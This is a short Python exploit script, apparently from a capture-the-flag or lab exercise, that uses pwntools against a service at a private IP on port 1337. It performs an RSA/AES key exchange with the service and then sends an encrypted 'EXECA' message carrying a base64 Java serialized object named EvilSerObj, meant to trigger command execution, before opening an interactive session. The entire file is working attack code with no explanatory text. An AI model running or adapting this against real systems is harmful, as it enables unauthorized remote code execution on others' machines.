#!/usr/bin/python3

from pwn import *
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

from base64 import b64encode, b64decode

HOST = "192.168.192.187"; PORT = 1337

io = remote(HOST, PORT) 

EvilSerObj = "rO0ABXNyABxjb20ubGlua2VkY2hhdC51dGlscyRFeGVjT2Jq4KEVkHtu1wkCAAJaAANLZXlMAANDbWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cAFw"

def generate_rsa_keypair():
    key = RSA.generate(2048)

    private_key = key
    public_key = key.publickey()
    
    return public_key, private_key

pubkey, prikey = generate_rsa_keypair()

def clean_key(key_pem):
    # Remove header and footer lines
    key_pem = key_pem.replace("-----BEGIN RSA PRIVATE KEY-----", "")
    key_pem = key_pem.replace("-----END RSA PRIVATE KEY-----", "")
    key_pem = key_pem.replace("-----BEGIN PUBLIC KEY-----", "")
    key_pem = key_pem.replace("-----END PUBLIC KEY-----", "")

    key_pem = key_pem.replace("\n", "")

    return key_pem.encode()

def rsaDecrypt(enc):
    global prikey
    de_rsa = PKCS1_v1_5.new(prikey)
    return de_rsa.decrypt(b64decode(enc), None)   

def getAesKey(symkey):
    pair = symkey.split(": ")[1].split(":")
    return pair

def encrypt(msg):
    global cipher, aesIv

    return b64encode(cipher.encrypt(pad(msg.encode('utf-8'), 
            AES.block_size)))



log.info("Sending public key...")
io.sendline(b"PUKEY: " + clean_key(pubkey.export_key().decode()))

SymKey = rsaDecrypt(io.recvline().decode()).decode()
log.info("SymKey: " + SymKey.split(": ")[1])

aesKey, aesIv = getAesKey(SymKey)
cipher = AES.new(b64decode(aesKey), AES.MODE_CBC, b64decode(aesIv))

io.sendline(encrypt("EXECA: " + EvilSerObj))

io.interactive()
